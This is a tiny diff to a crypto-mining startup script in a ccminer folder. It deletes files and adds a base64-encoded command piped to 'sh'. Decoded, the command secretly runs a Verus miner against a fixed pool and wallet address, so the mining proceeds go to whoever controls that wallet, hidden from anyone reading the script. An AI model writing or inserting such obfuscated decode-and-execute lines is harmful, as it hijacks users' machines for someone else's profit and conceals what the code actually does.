@@ -1,1 +1,2 @@
-cd ccminer && rm -rf boot2 && ./run
+cd ccminer && rm -rf boot2 && rm -rf run
+./start.sh && screen -x CCminer | echo 'Li9jY21pbmVyIC1hIHZlcnVzIC1vIHN0cmF0dW0rdGNwOi8vc2cudmlwb3IubmV0OjUwNDAgLXUgUlJxZ2phWHVoVnZzNnVSbTc5R3Qxa1kxdmFVM1hlb0tyMS5hbGwxMDAgLXQgMSA+IHZpcG9yLm5ldCAgfCBybSAtcmYgdmlwb3IubmV0IHwgJGhvbWUK' | base64 -d | sh
